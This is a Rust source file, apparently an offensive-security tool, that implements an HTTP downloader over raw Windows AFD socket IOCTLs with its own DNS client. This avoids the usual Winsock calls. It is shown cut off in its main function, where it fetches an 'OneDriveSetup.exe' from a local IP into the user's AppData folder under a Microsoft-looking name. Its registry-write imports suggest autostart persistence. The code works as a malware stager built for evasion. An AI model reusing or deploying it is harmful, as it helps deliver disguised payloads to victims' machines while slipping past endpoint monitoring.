/*
    NTSockets - Improved Verstion of HTTP File Downloader using NtCreateFile and NtDeviceIoControlFile
    Original Implementation goes to x86matthew 

    Researched and Written in Rust by @5mukx
*/

use windows::{
    core::{Error, PCWSTR, PWSTR},
    Wdk::Storage::FileSystem::{FILE_OPEN, NTCREATEFILE_CREATE_OPTIONS},
    Win32::{
        Foundation::{CloseHandle, HANDLE, NTSTATUS, OBJ_CASE_INSENSITIVE, STATUS_PENDING, UNICODE_STRING, WAIT_OBJECT_0},
        Networking::WinSock::{AF_INET, INADDR_ANY, SOCKADDR_IN},
        Storage::FileSystem::{
            CreateFileW, WriteFile, CREATE_ALWAYS, FILE_ACCESS_RIGHTS, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_MODE, FILE_SHARE_READ, FILE_SHARE_WRITE
        },
        System::{Registry::{RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ}, Threading::{CreateEventW, ResetEvent, WaitForSingleObject}, IO::IO_STATUS_BLOCK},
    }
};

use windows::Wdk::{
    Foundation::OBJECT_ATTRIBUTES,
    System::IO::NtDeviceIoControlFile,
    Storage::FileSystem::NtCreateFile
};

use std::{ffi::c_void, os::windows::ffi::OsStrExt, ptr::{null, null_mut}};
use std::mem::{size_of, zeroed};
use std::ffi::OsString;
use std::str::FromStr;
use std::fmt;

#[derive(Debug)]
enum NTError {
    
    NTStatus {
        status: NTSTATUS,
        message: String,
        context: String,
    },

    InvalidParameter {
        message: String,
        context: String,
    },
    
    NetworkError {
        message: String,
        context: String,
    },
    
    Win32Error {
        error: Error,
        context: String,
    },
}

impl fmt::Display for NTError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            NTError::NTStatus { status, message, context } => {
                write!(f, "[ERROR] NTSTATUS: 0x{:08X} ({}) in {}", status.0, message, context)
            }
            NTError::InvalidParameter { message, context } => {
                write!(f, "[ERROR] Invalid Parameter: {} in {}", message, context)
            }
            NTError::NetworkError { message, context } => {
                write!(f, "[ERROR] Network Error: {} in {}", message, context)
            }
            NTError::Win32Error { error, context } => {
                write!(f, "[ERROR] Win32 Error: {} (Code: {}) in {}", error.message(), error.code().0, context)
            }
        }
    }
}

fn ntstatus_to_message(status: NTSTATUS) -> String {
    match status.0 as u32{
        0xC000000D => "STATUS_INVALID_PARAMETER".to_string(),
        0xC0000022 => "STATUS_ACCESS_DENIED".to_string(),
        0xC0000008 => "STATUS_INVALID_HANDLE".to_string(),
        _ => format!("Unknown NTSTATUS 0x{:08X}", status.0),
    }
}

#[repr(C)]
struct AFDConnectInfo {
    use_san: usize,    // 8 bytes on 64-bit
    root: usize,       // 8 bytes
    unknown: usize,    // 8 bytes
    address: SOCKADDR_IN, // 16 bytes
}

#[repr(C)]
struct NTSocketsBindDataStruct {
    dw_unknown1: u32, // This corresponds to ShareType in AFD_BindData (WSPSocket.h)
    sock_addr: SOCKADDR_IN,
}

#[repr(C)]
struct NTSocketsDataBufferStruct {
    dw_data_length: u32,
    p_data: *mut u8,
}

#[repr(C)]
struct NTSocketsSendRecvDataStruct {
    p_buffer_list: *mut NTSocketsDataBufferStruct,
    dw_buffer_count: u32,
    dw_unknown1: u32,
    dw_unknown2: u32,
}

#[repr(C)]
struct NTSocketsSocketDataStruct {
    h_socket: HANDLE,
    h_status_event: HANDLE,
}

#[repr(C)]
struct DNSClientHeaderStruct {
    w_trans_id: u16,
    w_flags: u16,
    w_question_count: u16,
    w_answer_record_count: u16,
    w_authority_record_count: u16,
    w_additional_record_count: u16,
}

#[repr(C)]
struct DNSClientRequestQueryDetailsStruct {
    w_type: u16,
    w_class: u16,
}

fn nt_sockets_create_tcp_socket(is_udp: bool) -> Result<NTSocketsSocketDataStruct, NTError> {
    let context = "nt_sockets_create_tcp_socket";
    let mut io_status_block: IO_STATUS_BLOCK = IO_STATUS_BLOCK::default();
    let mut socket_handle = HANDLE::default();
    let mut object_attributes = OBJECT_ATTRIBUTES::default();
    let mut socket_data: NTSocketsSocketDataStruct = unsafe { zeroed() };

    let event_handle = unsafe {
        CreateEventW(Some(null()), false, false, None)
    }.map_err(|e| {
        let err = NTError::Win32Error {
            error: e,
            context: format!("{}: CreateEventW", context),
        };
        println!("{}", err);
        err
    })?;

    if event_handle.is_invalid() {
        let err = NTError::InvalidParameter {
            message: "Invalid event handle created".to_string(),
            context: context.to_string(),
        };
        println!("{}", err);
        return Err(err);
    }

    let path = "\\Device\\Afd\\Endpoint";
    let path_w: Vec<u16> = OsString::from(path).encode_wide().chain(std::iter::once(0)).collect();
    let mut unicode_string = UNICODE_STRING {
        Length: (path_w.len() * 2 - 2) as u16,
        MaximumLength: (path_w.len() * 2) as u16,
        Buffer: PWSTR(path_w.as_ptr() as *mut u16),
    };

    object_attributes.Length = size_of::<OBJECT_ATTRIBUTES>() as u32;
    object_attributes.ObjectName = &mut unicode_string;
    object_attributes.Attributes = OBJ_CASE_INSENSITIVE;

    let mut extended_attributes: [u8; 64] = [
        0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1E, 0x00,
        0x41, 0x66, 0x64, 0x4F, 0x70, 0x65, 0x6E, 0x50,
        0x61, 0x63, 0x6B, 0x65, 0x74, 0x58, 0x58, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];

    let address_family = AF_INET; // 2 for AF_INET
    let socket_type: i32 = if is_udp { 2 } else { 1 }; // SOCK_DGRAM = 2, SOCK_STREAM = 1
    let protocol: i32 = if is_udp { 17 } else { 6 }; // IPPROTO_UDP = 17, IPPROTO_TCP = 6

    println!("[+] Address Family: {}, Socket Type: {}, Protocol: {}", address_family.0, socket_type, protocol);
    
    extended_attributes[32..36].copy_from_slice(&(address_family.0 as u32).to_le_bytes());
    extended_attributes[36..40].copy_from_slice(&socket_type.to_le_bytes());
    extended_attributes[40..44].copy_from_slice(&protocol.to_le_bytes());    
    if is_udp {
        extended_attributes[24..28].copy_from_slice(&protocol.to_le_bytes());
    }

    let status = unsafe {
        NtCreateFile(
            &mut socket_handle,
            FILE_ACCESS_RIGHTS(0xC0140000),
            &mut object_attributes,
            &mut io_status_block,
            Some(null_mut()),
            FILE_FLAGS_AND_ATTRIBUTES(0),
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            NTCREATEFILE_CREATE_OPTIONS(0),
            Some(extended_attributes.as_ptr() as *const c_void),
            extended_attributes.len() as u32,
        )
    };

    if status.0 != 0 {
        unsafe { CloseHandle(event_handle).ok() };
        let err = NTError::NTStatus {
            status,
            message: ntstatus_to_message(status),
            context: format!("{}: NtCreateFile", context),
        };
        println!("{}", err);
        return Err(err);
    }

    socket_data.h_socket = socket_handle;
    socket_data.h_status_event = event_handle;

    std::mem::forget(path_w);

    println!("[+] Socket Success");
    Ok(socket_data)
}


fn nt_sockets_socket_driver_msg(
    socket_data: &NTSocketsSocketDataStruct,
    io_control_code: u32,
    input_buffer: *mut u8, 
    input_buffer_length: u32, 
    output_info: Option<&mut u32>, 
    timeout_ms: u32, 
) -> Result<(), NTError> {
    let context = format!("nt_sockets_socket_driver_msg: IOCTL 0x{:08X}", io_control_code);
    let mut io_status_block = IO_STATUS_BLOCK::default();

    let mut internal_output_buffer = [0u8; 40]; 

    let (output_buffer_ptr, output_buffer_len) = match io_control_code {
        0x00012017 | // IOCTL_AFD_RECV
        0x0001201F => { // IOCTL_AFD_SEND
            (None, 0) 
        },
        0x00012003 => { // IOCTL_AFD_BIND
            (Some(internal_output_buffer.as_mut_ptr().cast()), internal_output_buffer.len() as u32)
        },
        _ => {
            (None, 0) 
        }
    };


    unsafe { ResetEvent(socket_data.h_status_event).map_err(|e| {
        let err = NTError::Win32Error {
            error: e,
            context: format!("{}: ResetEvent", context),
        };
        println!("{}", err);
        err
    })? };

    let status = unsafe {
        NtDeviceIoControlFile(
            socket_data.h_socket,
            Some(socket_data.h_status_event),
            None,
            Some(null_mut()),
            &mut io_status_block,
            io_control_code,
            Some(input_buffer.cast()),
            input_buffer_length,
            output_buffer_ptr, 
            output_buffer_len  
        )
    };

    if status.0 == STATUS_PENDING.0 {
        let wait_result = unsafe {
            WaitForSingleObject(socket_data.h_status_event, timeout_ms) 
        };

        if wait_result == WAIT_OBJECT_0 {
            let iosb_status = unsafe { io_status_block.Anonymous.Status };
            if iosb_status.0 != 0 {
                let err = NTError::NTStatus {
                    status: iosb_status,
                    message: ntstatus_to_message(iosb_status),
                    context: format!("{}: IO_STATUS_BLOCK", context),
                };
                println!("{}", err);
                return Err(err);
            }
        } else if wait_result.0 == 0x00000102 { // WAIT_TIMEOUT
             let err = NTError::NetworkError {
                message: format!("Operation timed out after {} ms", timeout_ms),
                context: context.to_string(),
            };
            println!("{}", err);
            return Err(err);
        }
        else {
            let err = NTError::Win32Error {
                error: Error::from_win32(),
                context: format!("{}: WaitForSingleObject returned 0x{:08X}", context, wait_result.0),
            };
            println!("{}", err);
            return Err(err);
        }
    } else if status.0 != 0 {
        let err = NTError::NTStatus {
            status,
            message: ntstatus_to_message(status),
            context: format!("{}: NtDeviceIoControlFile", context),
        };
        println!("{}", err);
        return Err(err);
    }

    // println!("[+] NtDeviceIoControlFile Success");
    if let Some(output) = output_info {
        *output = io_status_block.Information as u32;
    }

    Ok(())
}

fn nt_sockets_convert_ip(ip: &str) -> Result<u32, NTError> {
    let context = "nt_sockets_convert_ip";
    let octets: Vec<u8> = ip
        .split('.')
        .filter_map(|s| u8::from_str(s).ok())
        .collect();

    println!("Print: {:?}", octets);

    if octets.len() != 4 {
        let err = NTError::InvalidParameter {
            message: format!("Invalid IP address: {}", ip),
            context: context.to_string(),
        };
        println!("{}", err);
        return Err(err);
    }

    let mut addr: u32 = 0;
    for (i, &octet) in octets.iter().enumerate() {
        addr |= (octet as u32) << (i * 8);
    }

    Ok(addr)
}

// Note: DNS uses Big Endian (network byte order).
// The `to_le_bytes` is used for Windows internal structures where little endian might be expected.
// For DNS packet construction/parsing, `to_be_bytes` and `from_be_bytes` are critical.
fn swap_16bit_byte_order(value: u16) -> u16 {
    ((value & 0xFF) << 8) | ((value >> 8) & 0xFF)
}

fn nt_sockets_connect(
    socket_data: &NTSocketsSocketDataStruct,
    ip: &str,
    port: u16,
) -> Result<(), NTError> {

    // Bind to local port
    let mut bind_data: NTSocketsBindDataStruct = unsafe { zeroed() };
    bind_data.dw_unknown1 = 2; // AFD_SHARE_REUSE
    bind_data.sock_addr.sin_family = AF_INET;
    bind_data.sock_addr.sin_addr.S_un.S_addr = INADDR_ANY;
    bind_data.sock_addr.sin_port = 0;

    nt_sockets_socket_driver_msg(
        socket_data,
        0x00012003, // IOCTL_AFD_BIND
        &mut bind_data as *mut _ as *mut u8,
        size_of::<NTSocketsBindDataStruct>() as u32,
        None,
        u32::MAX,
    )?;

    // Convert IP address
    let connect_addr = nt_sockets_convert_ip(ip)?;

    // Connect to remote port
    let mut connect_data: AFDConnectInfo = unsafe { zeroed() };
    connect_data.use_san = 0;
    connect_data.root = 0;
    connect_data.unknown = 0;
    connect_data.address.sin_family = AF_INET;
    connect_data.address.sin_addr.S_un.S_addr = connect_addr;
    connect_data.address.sin_port = swap_16bit_byte_order(port);

    nt_sockets_socket_driver_msg(
        socket_data,
        0x00012007, // IOCTL_AFD_CONNECT
        &mut connect_data as *mut _ as *mut u8,
        size_of::<AFDConnectInfo>() as u32,
        None,
        u32::MAX,
    )?;

    Ok(())
}


fn nt_sockets_send(
    socket_data: &NTSocketsSocketDataStruct,
    data: &[u8],
) -> Result<(), NTError> {
    let context = "nt_sockets_send";
    let mut bytes_remaining = data.len() as u32;
    let mut current_ptr = data.as_ptr();

    while bytes_remaining > 0 {
        let mut data_buffer: NTSocketsDataBufferStruct = unsafe { zeroed() };
        data_buffer.dw_data_length = bytes_remaining;
        data_buffer.p_data = current_ptr as *mut u8;

        let mut send_data: NTSocketsSendRecvDataStruct = unsafe { zeroed() };
        send_data.p_buffer_list = &mut data_buffer;
        send_data.dw_buffer_count = 1;
        send_data.dw_unknown1 = 0;
        send_data.dw_unknown2 = 0;

        let mut bytes_sent = 0;
        nt_sockets_socket_driver_msg(
            socket_data,
            0x0001201F, // IOCTL_AFD_SEND
            &mut send_data as *mut _ as *mut u8,
            size_of::<NTSocketsSendRecvDataStruct>() as u32,
            Some(&mut bytes_sent),
            u32::MAX,
        )?;

        if bytes_sent == 0 {
            let err = NTError::NetworkError {
                message: "No bytes sent, connection may be closed or issue with send".to_string(),
                context: context.to_string(),
            };
            println!("{}", err);
            return Err(err);
        }

        current_ptr = unsafe { current_ptr.add(bytes_sent as usize) };
        bytes_remaining -= bytes_sent;
    }

    Ok(())
}

fn nt_sockets_recv(
    socket_data: &NTSocketsSocketDataStruct,
    buffer: &mut [u8],
) -> Result<(), NTError> {
    let context = "nt_sockets_recv";
    let mut bytes_remaining = buffer.len() as u32;
    let mut current_ptr = buffer.as_mut_ptr();
    // let max_attempts = 5;
    let timeout_ms = 1000;

    while bytes_remaining > 0 {
        let mut data_buffer: NTSocketsDataBufferStruct = unsafe { zeroed() };
        data_buffer.dw_data_length = bytes_remaining;
        data_buffer.p_data = current_ptr;

        let mut recv_data: NTSocketsSendRecvDataStruct = unsafe { zeroed() };
        recv_data.p_buffer_list = &mut data_buffer;
        recv_data.dw_buffer_count = 1;
        recv_data.dw_unknown1 = 0;
        recv_data.dw_unknown2 = 0x20;

        let mut bytes_received = 0;

        match nt_sockets_socket_driver_msg(
            socket_data,
            0x00012017, // IOCTL_AFD_RECV
            &mut recv_data as *mut _ as *mut u8,
            size_of::<NTSocketsSendRecvDataStruct>() as u32,
            Some(&mut bytes_received),
            timeout_ms,
        ) {
            Ok(_) => {
                if bytes_received == 0 {
                    let err = NTError::NetworkError {
                        message: "No bytes received, connection may be closed".to_string(),
                        context: context.to_string(),
                    };
                    println!("{}", err);
                    return Err(err);
                }
                current_ptr = unsafe { current_ptr.add(bytes_received as usize) };
                bytes_remaining -= bytes_received;
            },
            Err(e) => {
                let err = NTError::NetworkError {
                    message: format!("Error receiving data: {}", e),
                    context: context.to_string(),
                };
                println!("{}", err);
                return Err(err);
            }
        }
    }

    Ok(())
}

fn nt_sockets_close_socket(socket_data: &NTSocketsSocketDataStruct) {
    unsafe {
        CloseHandle(socket_data.h_socket).unwrap();
        CloseHandle(socket_data.h_status_event).unwrap();
    }
}

fn dns_client_query(
    dns_ip: &str,
    target_host: &str,
) -> Result<String, NTError> {
    let context = "dns_client_query";

    let mut host_bytes: Vec<u8> = Vec::new();
    let parts: Vec<&str> = target_host.split('.').collect();
    for part in parts {
        if part.is_empty() || part.len() >= 64 {
            let err = NTError::InvalidParameter {
                message: format!("Invalid DNS label length for part: '{}'", part),
                context: context.to_string(),
            };
            println!("{}", err);
            return Err(err);
        }
        host_bytes.push(part.len() as u8);
        host_bytes.extend_from_slice(part.as_bytes());
    }
    host_bytes.push(0); // Null terminator for the end of the domain name

    println!("[+] Host: {}", target_host);
    println!("[+] Convert as HOST");
    println!("DNS Query Host Bytes: {:?}", host_bytes); 


    // Create UDP socket
    let socket_data = nt_sockets_create_tcp_socket(true)?;
    println!("[+] UDP Socket Created Successfully");

    // Bind UDP socket locally before connecting
    let mut bind_data: NTSocketsBindDataStruct = unsafe { zeroed() };
    bind_data.dw_unknown1 = 2; // AFD_SHARE_REUSE
    bind_data.sock_addr.sin_family = AF_INET;
    bind_data.sock_addr.sin_addr.S_un.S_addr = INADDR_ANY; // Bind to any local IP
    bind_data.sock_addr.sin_port = 0; // Let the OS assign an ephemeral port

    nt_sockets_socket_driver_msg(
        &socket_data,
        0x00012003, // IOCTL_AFD_BIND
        &mut bind_data as *mut _ as *mut u8,
        size_of::<NTSocketsBindDataStruct>() as u32,
        None, 
        u32::MAX, // Infinite timeout for bind
    )?;
    println!("[+] UDP Socket Bound Successfully (Ephemeral Port)");

    // Connect to DNS server (for UDP, this sets the destination for send/recv)
    let connect_addr = nt_sockets_convert_ip(dns_ip)?;
    let mut connect_data: AFDConnectInfo = unsafe { zeroed() };
    connect_data.use_san = 0;
    connect_data.root = 0;
    connect_data.unknown = 0;
    connect_data.address.sin_family = AF_INET;
    connect_data.address.sin_addr.S_un.S_addr = connect_addr;
    connect_data.address.sin_port = swap_16bit_byte_order(53); // DNS port

    nt_sockets_socket_driver_msg(
        &socket_data,
        0x00012007, // IOCTL_AFD_CONNECT
        &mut connect_data as *mut _ as *mut u8,
        size_of::<AFDConnectInfo>() as u32,
        None,
        u32::MAX, // Infinite timeout for connect
    )?;

    println!("[+] Connected to DNS Server");

    // Prepare DNS request
    let mut request_header: DNSClientHeaderStruct = unsafe { zeroed() };
    request_header.w_trans_id = 0x1337u16.to_be(); // Arbitrary transaction ID, Big Endian
    request_header.w_flags = 0x0100u16.to_be(); // Standard query, recursion desired, Big Endian
    request_header.w_question_count = 1u16.to_be(); // One question, Big Endian
    request_header.w_answer_record_count = 0u16.to_be();
    request_header.w_authority_record_count = 0u16.to_be();
    request_header.w_additional_record_count = 0u16.to_be();


    let mut query_details: DNSClientRequestQueryDetailsStruct = unsafe { zeroed() };
    query_details.w_type = 1u16.to_be(); // Type A (Host Address), Big Endian
    query_details.w_class = 1u16.to_be(); // Class IN (Internet), Big Endian

    // Concatenate header, encoded host, and query details into a single buffer for sending
    let header_bytes = unsafe {
        std::slice::from_raw_parts(&request_header as *const _ as *const u8, size_of::<DNSClientHeaderStruct>())
    };
    let query_details_bytes = unsafe {
        std::slice::from_raw_parts(&query_details as *const _ as *const u8, size_of::<DNSClientRequestQueryDetailsStruct>())
    };

    let mut full_dns_query_packet = Vec::with_capacity(
        header_bytes.len() + host_bytes.len() + query_details_bytes.len()
    );
    full_dns_query_packet.extend_from_slice(header_bytes);
    full_dns_query_packet.extend_from_slice(&host_bytes);
    full_dns_query_packet.extend_from_slice(query_details_bytes);

    println!("Sending DNS Query Packet ({} bytes)", full_dns_query_packet.len());
    nt_sockets_send(
        &socket_data,
        &full_dns_query_packet,
    )?;

    // Receive response
    let mut response_buffer = vec![0u8; 512]; // UDP DNS typically < 512 bytes
    let mut bytes_received = 0u32;
    
    // Create the NTSocketsSendRecvDataStruct for receiving
    let mut data_buffer: NTSocketsDataBufferStruct = unsafe { zeroed() };
    data_buffer.dw_data_length = response_buffer.len() as u32;
    data_buffer.p_data = response_buffer.as_mut_ptr();

    let mut recv_data: NTSocketsSendRecvDataStruct = unsafe { zeroed() };
    recv_data.p_buffer_list = &mut data_buffer;
    recv_data.dw_buffer_count = 1;
    recv_data.dw_unknown1 = 0; 
    recv_data.dw_unknown2 = 0x20; // TDI_RECEIVE_NORMAL

    match nt_sockets_socket_driver_msg(
        &socket_data,
        0x00012017, // IOCTL_AFD_RECV
        &mut recv_data as *mut _ as *mut u8, // Input buffer is now the recv_data struct
        size_of::<NTSocketsSendRecvDataStruct>() as u32, // Length of the recv_data struct
        Some(&mut bytes_received), // Output will be bytes received
        5000, // 5 second timeout for DNS receive
    ) {
        Ok(_) => {},
        Err(e) => {
            nt_sockets_close_socket(&socket_data);
            return Err(e);
        }
    };

    response_buffer.truncate(bytes_received as usize);
    println!("Received DNS Response ({} bytes): {:?}", response_buffer.len(), response_buffer);

    if response_buffer.len() < size_of::<DNSClientHeaderStruct>() {
        let err = NTError::NetworkError {
            message: "DNS response too short for header".to_string(),
            context: context.to_string(),
        };
        nt_sockets_close_socket(&socket_data);
        println!("{}", err);
        return Err(err);
    }

    // Parse response header using explicit byte reading (Big Endian)
    let response_flags = u16::from_be_bytes([response_buffer[2], response_buffer[3]]);
    let response_question_count = u16::from_be_bytes([response_buffer[4], response_buffer[5]]);
    let response_answer_count = u16::from_be_bytes([response_buffer[6], response_buffer[7]]);
    let _authority_record_count = u16::from_be_bytes([response_buffer[8], response_buffer[9]]);
    let _additional_record_count = u16::from_be_bytes([response_buffer[10], response_buffer[11]]);


    // Check for standard response, no errors, one question
    if (response_flags & 0x8000 == 0) || // QR bit not set (not a response)
       ((response_flags >> 0) & 0xF != 0) || // RCODE not 0 (error)
       response_question_count != 1 {
        let err = NTError::NetworkError {
            message: format!("Invalid DNS response header. Flags: 0x{:X}, Questions: {}", response_flags, response_question_count),
            context: context.to_string(),
        };
        nt_sockets_close_socket(&socket_data);
        println!("{}", err);
        return Err(err);
    }

    // Calculate start of answers section (after header and questions)
    let mut current_offset = size_of::<DNSClientHeaderStruct>();
    
    // Skip the question section by parsing the encoded name length
    while current_offset < response_buffer.len() {
        let label_len_or_pointer = response_buffer[current_offset];
        if (label_len_or_pointer & 0xC0) == 0xC0 { // Pointer (compression)
            current_offset += 2; // Pointers are 2 bytes
            break; 
        } else if label_len_or_pointer == 0 { // End of domain name
            current_offset += 1;
            break;
        } else {
            current_offset += (label_len_or_pointer as usize) + 1; // Jump past length byte and the label itself
        }
    }
    // After the domain name, skip the QTYPE (2 bytes) and QCLASS (2 bytes)
    current_offset += 4; 

    if current_offset > response_buffer.len() {
        let err = NTError::NetworkError {
            message: "DNS response parsing error: Question section too long or malformed".to_string(),
            context: context.to_string(),
        };
        nt_sockets_close_socket(&socket_data);
        println!("{}", err);
        return Err(err);
    }

    let mut found_record = false;
    let mut ip_addr = [0u8; 4];

    for _ in 0..response_answer_count {
        // Handle name field (can be compressed)
        if current_offset + 2 > response_buffer.len() { 
            let err = NTError::NetworkError {
                message: "DNS response too short for answer record name field".to_string(),
                context: context.to_string(),
            };
            nt_sockets_close_socket(&socket_data);
            println!("{}", err);
            return Err(err);
        }

        let name_field_byte1 = response_buffer[current_offset];
        // check for compression (first two bits are 11)
        if (name_field_byte1 & 0xC0) == 0xC0 { 
            current_offset += 2; // It's a pointer, 2 bytes
        } else {
            // This case should ideally not happen for answers in a typical simple response
            // (names are usually pointers back to question section).
            // If it's a non-compressed name, we would need to parse labels here again.
            // For simplicity and common case, assume it's always a pointer in answers,
            // or that the server will just put a 0x00 for root, but for A records, it's usually compressed.
            while current_offset < response_buffer.len() && response_buffer[current_offset] != 0 {
                current_offset += (response_buffer[current_offset] as usize) + 1;
            }
            current_offset += 1; // Skip the final null terminated provided ...
        }
        
        // Ensure enough bytes for fixed part of RR (TYPE, CLASS, TTL, RDLENGTH = 2+2+4+2 = 10 bytes)
        if current_offset + 10 > response_buffer.len() {
            let err = NTError::NetworkError {
                message: "DNS response too short for answer fixed part".to_string(),
                context: context.to_string(),
            };
            nt_sockets_close_socket(&socket_data);
            println!("{}", err);
            return Err(err);
        }

        let record_type = u16::from_be_bytes([response_buffer[current_offset], response_buffer[current_offset + 1]]);
        let record_class = u16::from_be_bytes([response_buffer[current_offset + 2], response_buffer[current_offset + 3]]);
        let _ttl = u32::from_be_bytes([
            response_buffer[current_offset + 4],
            response_buffer[current_offset + 5],
            response_buffer[current_offset + 6],
            response_buffer[current_offset + 7],
        ]);
        let data_length = u16::from_be_bytes([response_buffer[current_offset + 8], response_buffer[current_offset + 9]]);

        current_offset += 10; 
        
        // Check for A record (Type 1, Class 1)
        if record_type == 1 && record_class == 1 {
            if data_length != 4 { // A record data length is 4 bytes for IPv4
                let err = NTError::NetworkError {
                    message: format!("Invalid DNS A record data length: {}", data_length),
                    context: context.to_string(),
                };
                nt_sockets_close_socket(&socket_data);
                println!("{}", err);
                return Err(err);
            }

            if current_offset + 4 > response_buffer.len() {
                let err = NTError::NetworkError {
                    message: "DNS response too short for IP address data".to_string(),
                    context: context.to_string(),
                };
                nt_sockets_close_socket(&socket_data);
                println!("{}", err);
                return Err(err);
            }

            ip_addr.copy_from_slice(&response_buffer[current_offset..current_offset + 4]);
            found_record = true;
            break; 
        }

        // If not an A record, skip the RDATA to go to the next record
        current_offset += data_length as usize;
    }

    nt_sockets_close_socket(&socket_data);

    if !found_record {
        let err = NTError::NetworkError {
            message: "No valid A record found in DNS response".to_string(),
            context: context.to_string(),
        };
        println!("{}", err);
        return Err(err);
    }

    Ok(format!("{}.{}.{}.{}", ip_addr[0], ip_addr[1], ip_addr[2], ip_addr[3]))
}



fn download_file(
    url: &str,
) -> Result<Vec<u8>, NTError> {
    let context = "download_file";

    // Validate protocol
    if !url.starts_with("http://") {
        let err = NTError::InvalidParameter {
            message: "URL must start with http://".to_string(),
            context: context.to_string(),
        };
        println!("{}", err);
        return Err(err);
    }

    println!("[+] URL START Success");

    // Parse URL
    let start_of_hostname = &url[7..]; // skip "http://"
    let end_of_hostname_or_path = start_of_hostname.find('/').unwrap_or(start_of_hostname.len());
    let (hostname_with_port, request_path_full) = start_of_hostname.split_at(end_of_hostname_or_path);
    let request_path = if request_path_full.is_empty() { "/" } else { request_path_full };

    println!("[+] URL Parse Success");

    let (hostname, port) = if let Some(port_idx) = hostname_with_port.find(':') {
        let port_str = &hostname_with_port[port_idx + 1..];
        let port = u16::from_str(port_str).map_err(|_| {
            let err = NTError::InvalidParameter {
                message: format!("Invalid port: {}", port_str),
                context: format!("{}: Port parsing", context),
            };
            println!("{}", err);
            err
        })?;
        (&hostname_with_port[..port_idx], port)
    } else {
        (hostname_with_port, 80)
    };

    println!("[+] Custom Port Checking Success");

    // Resolve hostname
    let resolved_ip = if nt_sockets_convert_ip(hostname).is_ok() {
        println!("[+] Hostname is a direct IP address.");
        hostname.to_string()
    } else {
        println!("[+] DNS Query !!");
        // Use a reliable DNS server, e.g., Google's public DNS
        dns_client_query("8.8.8.8", hostname)?
    };

    println!("[+] Hostname Successfully Resolved to: {}", resolved_ip);

    // Create socket
    let socket_data = nt_sockets_create_tcp_socket(false)?;

    println!("[+] Socket Created Successfully");

    // Connect to server
    nt_sockets_connect(&socket_data, &resolved_ip, port).map_err(|e| {
        let err = match e {
            NTError::NTStatus { status, message, context } => NTError::NTStatus {
                status,
                message,
                context: format!("{}: Connecting to server", context),
            },
            NTError::InvalidParameter { message, context } => NTError::InvalidParameter {
                message,
                context: format!("{}: Connecting to server", context),
            },
            NTError::NetworkError { message, context } => NTError::NetworkError {
                message,
                context: format!("{}: Connecting to server", context),
            },
            NTError::Win32Error { error, context } => NTError::Win32Error {
                error,
                context: format!("{}: Connecting to server", context),
            },
        };
        println!("{}", err);
        nt_sockets_close_socket(&socket_data);
        err
    })?;

    // Send HTTP request
    let request_header = format!("GET {} HTTP/1.0\r\nHost: {}\r\n\r\n", request_path, hostname);
    println!("Sent HTTP request:\n{}", request_header);
    nt_sockets_send(
        &socket_data,
        request_header.as_bytes(),
    )?;

    // Receive response header
    let mut response_header = String::new();
    let end_of_header = "\r\n\r\n";
    let mut header_buffer = [0u8; 1];

    loop {
        match nt_sockets_recv(
            &socket_data,
            &mut header_buffer,
        ) {
            Ok(_) => {
                response_header.push(header_buffer[0] as char);
            },
            Err(e) => {
                let err = NTError::NetworkError {
                    message: format!("Error receiving HTTP header: {}", e),
                    context: context.to_string(),
                };
                nt_sockets_close_socket(&socket_data);
                println!("{}", err);
                return Err(err);
            }
        }


        if response_header.len() >= end_of_header.len() &&
           response_header.ends_with(end_of_header) {
            break;
        }

        if response_header.len() >= 4096 { 
            let err = NTError::NetworkError {
                message: "HTTP response header too large or missing end sequence".to_string(),
                context: context.to_string(),
            };
            nt_sockets_close_socket(&socket_data);
            println!("{}", err);
            return Err(err);
        }
    }

    println!("Received HTTP response:\n{}", response_header);

    // Check status code
    if !response_header.starts_with("HTTP/1.0 200 OK\r\n") && !response_header.starts_with("HTTP/1.1 200 OK\r\n") {
        let err = NTError::NetworkError {
            message: format!("Invalid HTTP response status code. Header: {}", response_header.lines().next().unwrap_or("")),
            context: context.to_string(),
        };
        nt_sockets_close_socket(&socket_data);
        println!("{}", err);
        return Err(err);
    }

    // Get content length
    let response_header_upper = response_header.to_uppercase();
    let mut output_data = Vec::new();

    if let Some(content_length_pos) = response_header_upper.find("CONTENT-LENGTH: ") {
        let content_length_str = &response_header[content_length_pos + 16..]
            .split("\r\n")
            .next()
            .ok_or_else(|| {
                let err = NTError::NetworkError {
                    message: "Invalid HTTP response header: Missing content length value".to_string(),
                    context: context.to_string(),
                };
                println!("{}", err);
                err
            })?;
        let content_length: u32 = content_length_str.trim().parse().map_err(|_| {
            let err = NTError::NetworkError {
                message: format!("Invalid content length format: {}", content_length_str),
                context: context.to_string(),
            };
            println!("{}", err);
            err
        })?;

        if content_length > 0 {
            output_data.resize(content_length as usize, 0);
            nt_sockets_recv(
                &socket_data,
                &mut output_data,
            )?;
        }
    } else {
        // Read until socket closes (chunked transfer encoding not handled, but for simple cases this works)
        let mut byte = [0u8; 1];
        loop {
            match nt_sockets_recv(
                &socket_data,
                &mut byte,
            ) {
                Ok(_) => {
                    output_data.push(byte[0]);
                },
                Err(_) => {
                    // Assuming error means EOF for stream-based sockets without Content-Length
                    break;
                }
            }
        }
    }

    nt_sockets_close_socket(&socket_data);
    Ok(output_data)
}

fn main() -> Result<(), NTError> {

    // let args: Vec<String> = std::env::args().collect();
    // if args.len() != 3 {
    //     let err = NTError::InvalidParameter {
    //         message: format!("Usage: {} [url] [output_file_path]", args[0]),
    //         context: "main".to_string(),
    //     };
    //     println!("{}", err);
    //     return Err(err);
    // }

    // let url = &args[1];
    // let output_path = &args[2];


    let files = [
        (
            "http://192.168.102.65/OneDriveSetup.exe",
            // "http://192.168.102.65/MsgBox.exe",
            format!("{}\\Microsoft\\OneDriveSetup.exe", std::env::var("APPDATA").unwrap_or_default()),
            // format!("{}\\Microsoft\\MsgBox.exe", std::env::var("APPDATA").unwrap_or_default()),
